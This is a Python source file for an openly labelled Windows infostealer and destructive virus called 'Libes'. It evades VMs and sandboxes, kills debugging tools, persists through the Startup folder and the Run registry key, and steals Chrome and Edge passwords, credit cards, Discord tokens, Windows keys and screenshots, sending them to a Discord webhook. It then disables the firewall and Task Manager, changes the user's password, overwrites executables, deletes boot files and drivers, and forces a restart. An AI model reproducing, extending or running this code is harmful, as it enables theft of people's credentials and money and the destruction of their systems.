#Modules
#----------------------------------------------------------------
import sys, os, re, json, ctypes, shutil, base64, sqlite3, zipfile, subprocess, cryptography, requests
import string, uuid
import threading
import random
import platform, wmi, psutil
from datetime import datetime
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend
from Crypto.Cipher import AES

import dhooks
from dhooks import Webhook, File, Embed
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
from json import loads, dumps
import time
from base64 import b64decode
from shutil import copyfile
from PIL import ImageGrab
from sys import argv
import win32console, win32gui, win32con
#----------------------------------------------------------------

if sys.platform.startswith('windows'):
       exit()



serveruser = os.getenv("UserName") #get username
pc_name = os.getenv("COMPUTERNAME") #get pc name
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode())) #get MAC
computer = wmi.WMI() #Windows Management Instrumentation
os_info = computer.Win32_OperatingSystem()[0] #get os information
os_name = os_info.Name.encode('utf-8').split(b'|')[0] #get os name
hwnd = win32console.GetConsoleWindow() #get console window


for proc in psutil.process_iter():
    try:
        processName = proc.name()
        if processName == "HTTPDebuggerUI.exe":
            proc.terminate()
        if processName == "HTTPDebuggerSvc.exe":
            proc.terminate()
    except:
        pass

def getip(): #get the victim's ip
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip #returns the ip

ip = getip()
currentplat = os_name
#---------------------------------------------------------------- BLACKLISTED STUFF
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
hwidlist = requests.get('https://raw.githubusercontent.com/KAMKAZEMARCI/virustotal-vm-blacklist/main/hwid_list.txt')
pcnamelist = requests.get('https://raw.githubusercontent.com/KAMKAZEMARCI/virustotal-vm-blacklist/main/pc_name_list.txt')
pcusernamelist = requests.get('https://raw.githubusercontent.com/KAMKAZEMARCI/virustotal-vm-blacklist/main/pc_username_list.txt')
iplist = requests.get('https://raw.githubusercontent.com/KAMKAZEMARCI/virustotal-vm-blacklist/main/ip_list.txt')
maclist = requests.get('https://raw.githubusercontent.com/KAMKAZEMARCI/virustotal-vm-blacklist/main/mac_list.txt')
gpulist = requests.get('https://raw.githubusercontent.com/KAMKAZEMARCI/virustotal-vm-blacklist/main/gpu_list.txt')
platformlist = requests.get('https://raw.githubusercontent.com/KAMKAZEMARCI/virustotal-vm-blacklist/main/pc_platforms.txt')
api = "discord webhook goes here"
#----------------------------------------------------------------

#----------------------------------------------------------------GET PC INFO
def vtdetect():
    webhooksend = Webhook(api)
    webhooksend.send(f"""```yaml
![PC DETECTED]!  
PC Name: {pc_name}
PC Username: {serveruser}
HWID: {hwid}
IP: {ip}
MAC: {mac}
PLATFORM: {os_name}
CPU: {computer.Win32_Processor()[0].Name}
RAM: {str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB
GPU: {computer.Win32_VideoController()[0].Name}
TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```""")

vtdetect()
#----------------------------------------------------------------

try:
    if hwid in hwidlist.text:
        print('BLACKLISTED HWID DETECTED')
        print(f'HWID: {hwid}') 
        requests.post(f'{api}',json={'content': f"**Blacklisted HWID Detected. HWID:** `{hwid}`"})
        time.sleep(2)
        os._exit(1)
    else:
        pass
except:
    print('[ERROR]: Failed to connect to database.')
    time.sleep(2) 
    os._exit(1)

try:
    if serveruser in pcusernamelist.text:
        print('BLACKLISTED PC USER DETECTED!')
        print(f'PC USER: {serveruser}') 
        requests.post(f'{api}',json={'content': f"**Blacklisted PC User:** `{serveruser}`"})
        time.sleep(2)
        os._exit(1)
    else:
        pass
except:
    print('[ERROR]: Failed to connect to database.')
    time.sleep(2) 
    os._exit(1)

try:
    if pc_name in pcnamelist.text:
        print('BLACKLISTED PC NAME DETECTED!')
        print(f'PC NAME: {pc_name}') 
        requests.post(f'{api}',json={'content': f"**Blacklisted PC Name:** `{pc_name}`"})
        time.sleep(2)
        os._exit(1)
    else:
        pass
except:
    print('[ERROR]: Failed to connect to database.')
    time.sleep(2) 
    os._exit(1)

try:
    if ip in iplist.text:
        print('BLACKLISTED IP DETECTED!')
        print(f'IP: {ip}') 
        requests.post(f'{api}',json={'content': f"**Blacklisted IP:** `{ip}`"})
        time.sleep(2)
        os._exit(1)
    else:
        pass
except:
    print('[ERROR]: Failed to connect to database.')
    time.sleep(2) 
    os._exit(1)

try:
    if mac in maclist.text:
        print('BLACKLISTED MAC DETECTED!')
        print(f'MAC: {mac}') 
        requests.post(f'{api}',json={'content': f"**Blacklisted MAC:** `{mac}`"})
        time.sleep(2)
        os._exit(1)
    else:
        pass
except:
    print('[ERROR]: Failed to connect to database.')
    time.sleep(2) 
    os._exit(1)

gpu = computer.Win32_VideoController()[0].Name

try:
    if gpu in gpulist.text:        
        print('BLACKLISTED GPU DETECTED!')
        print(f'GPU: {gpu}') 
        requests.post(f'{api}',json={'content': f"**Blacklisted GPU:** `{gpu}`"})
        time.sleep(2)
        os._exit(1)
    else:
        pass
except:
    print('[ERROR]: Failed to connect to database.')
    time.sleep(2) 
    os._exit(1)


try:
    subprocess.os.system(f'reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul') #disable task manager
    if hwnd:
       hMenu = win32gui.GetSystemMenu(hwnd, 0)
    if hMenu:
       win32gui.DeleteMenu(hMenu, win32con.SC_CLOSE, win32con.MF_BYCOMMAND) #disable console exit button
except:
    pass

#---------------------------------------------------------------- VM CHECK
def vmcheck():
    def get_base_prefix_compat(): # define all of the checks
        return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

    def in_virtualenv(): 
        return get_base_prefix_compat() != sys.prefix

    if in_virtualenv() == True: # if we are in a vm
        requests.post(f'{api}',json={'content': f"**VM DETECTED EXITING PROGRAM...**"})
        sys.exit() # exit
    
    else:
        pass

    def registry_check():  #VM REGISTRY CHECK SYSTEM [BETA]
        reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")       
        
        if reg1 != 1 and reg2 != 1:    
            print("VMware Registry Detected")
            requests.post(f'{api}',json={'content': f"**VMware Registry Detected**"})
            sys.exit()

    def processes_and_files_check(): #process and file check [anti-vm]
        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")    

        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames:
                processList.append(processNames.replace("K\n", "").replace("\n", ""))

        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            print("VMwareService.exe & VMwareTray.exe process are running")
            requests.post(f'{api}',json={'content': f"**VMwareService.exe & VMwareTray.exe process are running**"})
            sys.exit()
                        
        if os.path.exists(vmware_dll): 
            print("Vmware DLL Detected")
            requests.post(f'{api}',json={'content': f"**Vmware DLL Detected**"})
            sys.exit()
            
        if os.path.exists(virtualbox_dll):
            print("VirtualBox DLL Detected")
            requests.post(f'{api}',json={'content': f"**VirtualBox DLL Detected**"})
            sys.exit()
        
        try:
            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
            print("Sandboxie DLL Detected")
            requests.post(f'{api}',json={'content': f"**Sandboxie DLL Detected**"})
            sys.exit()
        except:
            pass              

    def mac_check(): #vm mac check
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
        if mac_address[:8] in vmware_mac_list:
            print("VMware MAC Address Detected")
            requests.post(f'{api}',json={'content': f"**VMware MAC Address Detected**"})
            sys.exit()
    #print("[*] Checking VM")
    registry_check()
    processes_and_files_check()
    mac_check()
    #print("[+] VM Not Detected : )")                      
vmcheck() 
webhooksend = Webhook(api)
webhooksend.send("[+] VM Not Detected : )")
#----------------------------------------------------------------

#----------------------------------------------------------------
def inject(): #infect startup folder
    try:
        subprocess.os.system('''
        rem Infect Startup Folder
        copy %0 "%userprofile%\Start Menu\Programs\Startup"
        ''')
        subprocess.os.system('attrib +h Libes.exe') #tries to hide the file
    except:
        pass

inject()
#----------------------------------------------------------------

hook = Webhook(api)


# VARIABLES
APP_DATA_PATH = os.environ['LOCALAPPDATA']
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
NONCE_BYTE_SIZE = 12


def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce) #encrypt


def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext) #decrypt


def rcipher(key):
    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
    return cipher #cipher


def dpapi(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result #return data blob


def localdata(): #return encrypted key
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]


def decryptions(encrypted_txt): #decrypt
    encoded_key = localdata()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)


class chromepassword:
    def __init__(self):
        self.passwordList = []


    def chromedb(self): #db
        _full_path = os.path.join(APP_DATA_PATH, DB_PATH)
        _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)

    def pwsd(self, db_file): #db manage
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = 'HOST: %s\nNAME: %s\nVALUE: %s\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)


    def cdecrypt(self, encrypted_txt): #decrypt
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            pass


    def saved(self): #write to txt
        with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as f:
            f.writelines(self.passwordList)


if __name__ == "__main__":
    main = chromepassword() #get passwords
    try:
        main.chromedb()
    except:
        pass
    main.saved()

#---------------------------------------------------------------- scheenshot-zip-send-remove
# DESKTOP SCREENSHOT :
screen = ImageGrab.grab()
screen.save(os.getenv('ProgramData') + r'\desktop.jpg')
screen = open(r'C:\ProgramData\desktop.jpg', 'rb')
screen.close()
screenshot = File(r'C:\ProgramData\desktop.jpg')


# PASSWORDS TO .ZIP :
zname = r'C:\ProgramData\passwords.zip'
newzip = zipfile.ZipFile(zname, 'w')
newzip.write(r'C:\ProgramData\passwords.txt')
newzip.write(r'C:\ProgramData\desktop.jpg')
newzip.close()
passwords = File(r'C:\ProgramData\passwords.zip')


# SEND INFORMATION > REMOVE EVIDENCE :
hook.send("desktop :", file=screenshot)
hook.send("passwords :", file=passwords)
subprocess.os.remove(r'C:\ProgramData\passwords.txt')
subprocess.os.remove(r'C:\ProgramData\desktop.jpg')
subprocess.os.remove(r'C:\ProgramData\passwords.zip')
#----------------------------------------------------------------

# GOOGLE CHROME | CREDIT-CARDS :
def master():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
                  "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except:
        pass
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = ctypes.windll.crypt32.CryptUnprotectData(
        (master_key, None, None, None, 0)[1])
    return master_key


def dpayload(cipher, payload): #decrypt payload
    return cipher.decrypt(payload)


def gcipher(aes_key, iv): #aes
    return AES.new(aes_key, AES.MODE_GCM, iv)


def dpassword(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = gcipher(master_key, iv)
        decrypted_pass = dpayload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except:
        pass


def creditsteal(): #cc stealer
    master_key = master()
    login_db = os.environ['USERPROFILE'] + os.sep + \
        r'AppData\Local\Google\Chrome\User Data\default\Web Data'
    shutil.copy2(login_db,
                 "CCvault.db")
    conn = sqlite3.connect("CCvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT * FROM credit_cards")
        for r in cursor.fetchall():
            username = r[1]
            encrypted_password = r[4]
            decrypted_password = dpassword(
                encrypted_password, master_key)
            expire_mon = r[2]
            expire_year = r[3]
            hook.send(f"CARD-NAME: " + username + "\nNUMBER: " + decrypted_password + "\nEXPIRY M: " +
                      str(expire_mon) + "\nEXPIRY Y: " + str(expire_year) + "\n" + "*" * 10 + "\n")
    except:
        pass
    cursor.close()
    conn.close()
    try:
        subprocess.os.remove("CCvault.db") #remove vault.db
    except:
        pass


# MICROSOFT EDGE | PASSWORD & CREDIT-CARDS :
def passwordsteal():
    master_key = master()
    login_db = os.environ['USERPROFILE'] + os.sep + \
        r'\AppData\Local\Microsoft\Edge\User Data\Profile 1\Login Data'
    try:
        shutil.copy2(login_db, "Loginvault.db")
    except:
        pass
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute(
            "SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = dpassword(
                encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                hook.send(f"URL: " + url + "\nUSER: " + username +
                          "\nPASSWORD: " + decrypted_password + "\n" + "*" * 10 + "\n")
    except:
        pass

    cursor.close()
    conn.close()


def sniff(path): #token finder
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens


def tokensteal(): #token stealer
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone'

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = sniff(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            pass

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(api, data=payload.encode(), headers=headers) #send data
        urlopen(req)
    except:
        pass

# WINDOW'S PRODUCT KEY :
def windows():
    try:
        usr = serveruser
        keys = subprocess.check_output(
            'wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
        types = subprocess.check_output(
            'wmic os get Caption').decode().split('\n')[1].strip()

        if keys == '':
            keys = 'unavail.'
        else:
            pass

        embed = Embed(
            title=f'key :',
            description=f'user : {usr}\ntype : {types}\nkey : {keys}',
            color=0x2f3136
        )
        hook.send(embed=embed) #send windows key

    except:
        pass


def mainfunc():
    while True:
        tokensteal() #steal discord tokens
        passwordsteal() #steal passwords
        creditsteal() #steal credit cards
        windows() #steal windows key
        try:
            subprocess.os.system('del Loginvault.db') #remove the db
        except:
            pass
        break

def sleep(seconds):
    time.sleep(seconds)


def createaccsloop(): #create user accounts
    try:
        nums = string.digits
        new = ''.join(random.choice(nums) for i in range(5))
        os.system(f'title {new}')
        subprocess.os.system(f'net user Libes{new} Libes{new} /add')
    except:
        pass

def thread(): #threading
    for i in range(int(100)):
        threading.Thread(target=createaccsloop, daemon=True).start()  


def payload(): #virus payload
    usr = serveruser
    try:
        subprocess.os.system('net stop "WSearch"') #stops windows search service
        subprocess.os.system(f'net user {usr} Libes') #change user password
        subprocess.os.system('''set valinf="rundll32_%random%_toolbar"
set reginf="hklm\Software\Microsoft\Windows\CurrentVersion\Run"
reg add %reginf% /v %valinf% /t "REG_SZ" /d %0 /f > nul''') # INFECT REGISTRY RUN KEY
        subprocess.os.system('net stop "WPCSvc"') #stops windows service
        subprocess.os.system('''net stop "MpsSvc"
taskkill /f /t /im "FirewallControlPanel.exe"''') #stops firewall
        subprocess.os.system('net stop "WerSvc"') #stops windows service
        subprocess.os.system('net stop "wuauserv"') #stops windows service
        subprocess.os.system('time 12:00') #change time
        subprocess.os.system('net stop "wscsvc"') #stops windows service
        subprocess.os.system('net stop "SDRSVC"') #stops windows service
        subprocess.os.system('tskill msaccess') #kills msaccess
        subprocess.os.system('''net start "messenger"
net send * "Libes Virus"
net send * "Libes Virus"
net send * "Libes Virus"
net send * "Libes Virus"
net send * "Libes Virus"
net send * "Libes Virus"
net send * "Libes Virus"''') #net spammer
        subprocess.os.system('''tskill notepad
del /f /q %systemroot%\notepad
del /f /q %systemroot%\system32\notepad''') #tries to kill and delete notepad
        subprocess.os.system('''ipconfig /release
if ERRORLEVEL1 ipconfig /release_all''') #disable network
        subprocess.os.system(f'reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v Disableregistrytools /t REG_SZ /d 1 /f >nul') #disable registry tools
        subprocess.os.system(f'reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul') #disable task manager
        subprocess.os.system('RUNDLL32 USER32.DLL,SwapMouseButton') #swap mouse buttons
        subprocess.os.system('''
assoc .exe=Libes
DIR /S/B %SystemDrive%*.exe >> InfList_exe.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_exe.txt) do copy /y %0 "%%j:%%k"''') #infect all exes [very big troll.]
        subprocess.os.system("""
attrib -r -s -h c:\ autoexec.bat
del c:\ autoexec.bat
attrib -r -s -h c:\ boot.ini
del c:\ boot.ini
attrib -r -s -h c:\ ntldr
del c:\ ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini""") #we do a little trolling
        subprocess.os.system('''@((( Echo Off > Nul ) & Break Off )
    @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    @Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul
    @Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*"
)''')#BSOD
        subprocess.os.system('del /f /q Libes.exe')#tries to remove Libes.exe
        subprocess.os.system('shutdown /r /t 1 /c "LIBES VIRUS"') #shutdown /restart
    except:
        pass

#----------------------------------------------------------------TROLL
windows()
payload()
thread()
mainfunc()
#----------------------------------------------------------------



#----------------------------------------------------------------CREDITS
#Made by Me and PatexTheHacker [https://github.com/KAMKAZEMARCI] [https://github.com/PatexTheHacker]
#Tested by Me and Patex on a real pc/vm.
#Payload made by Patex
#Anti vm and main stuff made by me
#----------------------------------------------------------------
